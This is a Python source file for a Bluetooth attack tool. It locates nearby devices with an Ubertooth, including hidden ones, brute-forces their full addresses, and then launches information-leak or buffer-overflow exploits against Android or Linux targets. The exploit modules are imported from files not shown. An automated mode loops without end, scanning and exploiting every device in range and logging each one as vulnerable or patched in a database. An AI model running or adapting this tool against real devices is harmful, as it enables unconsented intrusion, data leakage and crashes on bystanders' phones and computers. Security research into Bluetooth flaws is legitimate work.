import os
import sys
import time
import struct
import select
import binascii
import subprocess
import progressbar
import threading
import bufferoverflow
import informationleak
import sql
import readFile
import lmpScan
import bluetooth

from bluetooth import _bluetooth as bt
from pyubertooth.ubertooth import Ubertooth
from pyubertooth.bluetooth_packet import BtbbPacket
from pwn import log

PWNING_TIMEOUT = 3
BNEP_PSM = 15
SQL_ACTIVE = False

# Scanning with ubertooth, can also detect invisible devices which actually communicate 
def scanWithUbertooth(src, mode, uapType):
    # Set scan duration depending on parameters
    lapDuration = 20
    uapDuration = 20
    if(mode=='-s'):
        lapDuration = 20
        uapDuration = 10
    elif (mode=='-m'):
        lapDuration = 30
        uapDuration = 20
    elif(mode=='-l'):
        lapDuration = 40
        uapDuration = 40

    # Try to detect nearby LAPs with Ubertooth
    prog = log.progress('Search nearby devices and calculate LAP')
    lapAddresses = []
    lapAddresses = detectLAP(lapDuration)
    prog.success()

    time.sleep(5)

    #Try to detect UAP per device with Ubertooth
    log.info('Calculate UAPs for found LAPs')
    guessedAddresses = []
    if(lapAddresses != None and len(lapAddresses) > 0):
        guessedAddresses = detectUAP(uapType, lapAddresses, uapDuration)

    # Print the result to the user so he can choose a device for further investigation
    if(guessedAddresses != None and len(guessedAddresses) != 0):
        #Find name of detected device and display it
        nearby_devices = detectDeviceName(guessedAddresses)

        if(SQL_ACTIVE != True):
            inputDevice,inputSystem, inputScanType = processInput()

            if(inputScanType==1):
                doExploit(inputScanType, inputSystem, nearby_devices[inputDevice-1][0], src)
            else:
                dst = detectNAP(nearby_devices[inputDevice-1][0], src, nearby_devices[inputDevice-1][1])
                if(dst != None):
                    doExploit(inputScanType, inputSystem, dst, src)
        else:
            for addr, name in nearby_devices:
                try:
                    deviceId = sql.selectByUAPLAP(addr)
                    sql.addTimestamp(deviceId)
                    if str(sql.checkDeviceStatusUAPLAP(addr)).__ne__("none"):
                        print("Skipped the device: %s because it's already tested." % (addr))
                        continue
                except:
                    deviceId = sql.insertDevice(name, addr, "Ubertooth")
                    checkDeviceOS(name, addr)
                    sql.addTimestamp(deviceId)

                sql.updateDeviceState(addr, 'UAP and LAP found. Starting exploit')
                print("Try Device with address %s and name %s" % (addr, name))
                doExploit(1, 1, addr, src)
    else:
        print("Couldn't find any valid Address!")

# Try to detect LAP of nearby devices with Ubertooth
def detectLAP(lapDuration):
    try:
        ut = Ubertooth()
        lapAddresses = []
        for data in ut.rx_stream(secs=lapDuration):
            temp = BtbbPacket(data=data)
            if temp.LAP != None and temp.LAP not in lapAddresses:
                lapAddresses.append(temp.LAP)
        ut.close()
        return lapAddresses
    except Exception as e:
        print("Ubertooth Error!")
        print(e)

# Calculate now the UAP for every found device
def detectUAP(uapType, lapAddresses, uapDuration):
    guessedAddresses = []

    #Calculate UAP with Ubertooth
    if(uapType != '-b'):
        try:
            for i in progressbar.progressbar(range(len(lapAddresses))):
                output = os.popen('ubertooth-rx -l %s -t %s' % (lapAddresses[i], uapDuration)).read()
                result = output.find('UAP')

                if (result != -1):
                    if(output[result+9:result+10] == " "):
                        guessedAddresses.append(str('0')+str(output[result+8:result+9])+str(lapAddresses[i]))
                    else:
                        guessedAddresses.append(str(output[result+8:result+10])+str(lapAddresses[i]))

            return guessedAddresses
        except Exception as e:
            print("DetectUAP error!")
            print(e)
    #Bruteforce UAP for founded LAPs
    else:
        for x in progressbar.progressbar(range(len(lapAddresses))):
            for i in range(256):
                try:
                    dstneu = ''
                    if(i < 16):
                        dstneu = "00:00:"+ "0" + hex(i)[2:4] + ":" + lapAddresses[x][0:2] + ":" + lapAddresses[x][2:4] + ":" + lapAddresses[x][4:6]
                    else:
                        dstneu = "00:00:"+ hex(i)[2:4] + ":" + lapAddresses[x][0:2] + ":" + lapAddresses[x][2:4] + ":" + lapAddresses[x][4:6]
                    
                    print("Testing address %s" % (dstneu))

                    sock=bluetooth.BluetoothSocket( bluetooth.L2CAP )
                    bluetooth.set_l2cap_mtu(sock, 50)
                    sock.settimeout(2)
                    sock.connect((dstneu, 1))

                    if(i < 16):
                        guessedAddresses.append("0" + str(hex(i)[2:4]) + lapAddresses[x])
                    else:
                        guessedAddresses.append(str(hex(i)[2:4]) + lapAddresses[x])
                except Exception as e:
                    print(e)
                    sock.close()
        
        return guessedAddresses

#Reads the device name from the target device
def detectDeviceName(guessedAddresses):
    count = 0
    nearby_devices = []
    for guessedAddress in guessedAddresses:
        count += 1
        dst = "00:00:" + guessedAddress[0:2].upper() + ":" + guessedAddress[2:4].upper() + ":" + guessedAddress[4:6].upper() + ":" + guessedAddress[6:8].upper()
        state = bluetooth.lookup_name(dst, timeout=20)
        nearby_devices.append([dst, state])

        if(SQL_ACTIVE != True):
            print(str(count) + ". " + str(guessedAddress) + " - " + str(state))

    return nearby_devices

#If the user chooses hard scan we need the NAP part of the address
#So we try to bruteforce it
def detectNAP(dst, src, deviceName):
    # Search first by name in the mac list for the choosen device 
    # and if nothing was found try all macs with the corresponding UAP
    macAddresses = []
    tmpMacAddresses = []
    macAddressesFromFile = readFile.readFile()
    if(deviceName != None):
        tmpMacAddresses = searchByName(deviceName.split(), macAddressesFromFile)
    if(len(tmpMacAddresses) > 0):
        macAddresses = tmpMacAddresses
    
    for entry in macAddressesFromFile:
        macAddresses.append(entry)

    possibleAddresses = []
    for macAddress in macAddresses:
        if(macAddress[0][4:6].lower() == dst[6:8].lower()):
            possibleAddresses.append(macAddress[0][0:4].lower())

    log.info('BruteForce all possible NAPs!')
    completeAddress = bruteForceCompleteAddress(dst, possibleAddresses)

    if(completeAddress != None):
        print("Address found its %s !" % (completeAddress))
        return completeAddress
    else:
        print("No address with brute force found! (Maybe not a valid android device?)")
        return None
        
# Search by name in the mac list
def searchByName(names, macAddresses):
    foundAddresses = []

    for macAddress in macAddresses:
        for name in names:
            if(macAddress[1].lower() == name.lower()):
                foundAddresses.append(macAddress)
    
    return foundAddresses

# Try to connect with all possible macs and if one connection is successful it's the right mac
def bruteForceCompleteAddress(dst, macAddresses):
    prog = log.progress("Brute Force all possible NAPs")
    for i in range(len(macAddresses)):
        try:
            dstneu = macAddresses[i][0:2] + ":" + macAddresses[i][2:4] + ":" + dst[6:8] + ":" + dst[9:11] + ":" + dst[12:14] + ":" + dst[15:17]

            sock=bluetooth.BluetoothSocket( bluetooth.L2CAP )
            sock.connect((dstneu, 15))

            prog.success()
            sock.close()
            return dstneu
        except:
            sock.close()

    prog.success()
    return None

# Normal scan mode only works with visible bluetooth devices
def normalScan(src):
    prog = log.progress('Scanning for devices...')
	
    nearby_devices = []
    try:
        nearby_devices = bluetooth.discover_devices(lookup_names = True)
    except Exception as e:
        print(e)

    print ("found %d devices" % len(nearby_devices))
     
    prog.success()

    if(len(nearby_devices) > 0):
        if(SQL_ACTIVE != True):
            count = 0
            for addr, name in nearby_devices:
                count += 1
                print ("%s. %s - %s" % (count, addr, name))

            inputDevice, inputSystem, inputScanType = processInput()
            dst = nearby_devices[inputDevice-1][0]

            doExploit(inputScanType, inputSystem, dst, src)
        else:
            for addr, name in nearby_devices:
                try:
                    deviceId = sql.selectByUAPLAP(addr)
                    sql.addTimestamp(deviceId)
                    if str(sql.checkDeviceStatusUAPLAP(addr)).__ne__("none"):
                        print("Skipped the device: %s because it's already tested." % (addr))
                        continue
                except:
                    deviceId = sql.insertDevice(name, addr, "NormalScan")
                    checkDeviceOS(name, addr)
                    sql.addTimestamp(deviceId)

                sql.updateDeviceState(addr, "Scanning started")
                doExploit(1, 1, addr, src)

# Process the Input from the User
def processInput():
    print("Choose a device: ")
    inputDevice = int(input())

    print("Define the target system: ")
    print("1. Android")
    print("2. Linux")
    inputSystem = int(input())

    print("Define the scan type: ")
    print("1. Soft Scan")
    print("2. Hard Scan")
    inputScanType = int(input())

    return inputDevice, inputSystem, inputScanType

# Execute the exploit
def doExploit(inputScanType, inputSystem, dst, src):
    lmpScan.findBluetoothVersion(dst, SQL_ACTIVE)
    if(inputScanType==1):
        if(inputSystem==1):
            informationleakState = informationleak.doInformationLeakAndroid(dst, SQL_ACTIVE)
            if(informationleakState == 2 and SQL_ACTIVE):
                sql.updateAttackstate(dst, "Vulnerable")
                sql.updateDeviceState(dst, "Device successfully tested")
            elif(informationleakState == 1 and SQL_ACTIVE):
                sql.updateAttackstate(dst, "Patched")
                sql.updateDeviceState(dst, "Device successfully tested")
            elif(informationleakState == 3 and SQL_ACTIVE):
                sql.updateAttackstate(dst, "Patched")
        elif(inputSystem==2):
            informationleak.doInformationLeakLinux(dst)
        else:
            print("No valid input!")
    elif(inputScanType==2):
        print("Caution! If you continue the device may crashes! Do you really want to continue [No/Yes]?")
        confirmation = raw_input()
        if(confirmation.find("Yes") != -1):
            if(inputSystem==1):
                bufferoverflow.doBufferOverflowAndroid(dst, src)
            elif(inputSystem==2):
                bufferoverflow.doBufferOverflowLinux(dst)
            else:
                print("No valid input!")
        else:
            return

#Check if the Devicename contains information about the device OS
def checkDeviceOS(name, mac):
    android = ["phone", "handy"]
    linux = ["raspy", "linux", "ubuntu"]
    mac = str(mac).replace(":","")
    if(name != None):
        if any(classifier in name.lower() for classifier in android):
            if(SQL_ACTIVE==True):
                sql.updateDeviceType(mac, 'Android')
            return 1
        if any(classifier in name.lower() for classifier in linux):
            if(SQL_ACTIVE==True):
                sql.updateDeviceType(mac, 'Linux')
            return 2

    if(SQL_ACTIVE==True):
        sql.updateDeviceType(mac, 'Unknown')
    return 0

def normalScanThradFunction(src):
    count = 0
    while(True):
        count += 1
        print("NormalScan Number %s" % (count))
        normalScan(src)
        print("--------------------")

def scanWithUbertoothThreadFunction(src, mode, uapType):
    count = 0
    while(True):
        count += 1
        print("scanWithUbertooth Number %s" % (count))
        scanWithUbertooth(src, mode, uapType)
        print("--------------------")  

def main(src_baddr, optArg1=None, optArg2=None, optArg3=None):
    if(optArg1=='-sql'):
        global SQL_ACTIVE
        SQL_ACTIVE = True
        sql.initDatabase()

        print("Start automated scan!")

        normalScanThread = threading.Thread(target=normalScanThradFunction, args=(src_baddr,))
        scanWithUbertoothThread = threading.Thread(target=scanWithUbertoothThreadFunction, args=(src_baddr, '-m', '-c'))

        if(optArg2=='-n'):
            normalScanThread.start()
        elif(optArg2=='-u'):
            scanWithUbertoothThread.start()
        else:
            normalScanThread.start()
            scanWithUbertoothThread.start()
    elif(optArg1=='-u' and optArg2 == '-b' and optArg3 != None):
        scanWithUbertooth(src_baddr, optArg3, optArg2)
    elif(optArg1=='-u' and optArg2 != None and optArg3 == None):
        scanWithUbertooth(src_baddr, optArg2, None)
    else:
        normalScan(src_baddr)

if __name__ == '__main__':
    main(*sys.argv[1:])
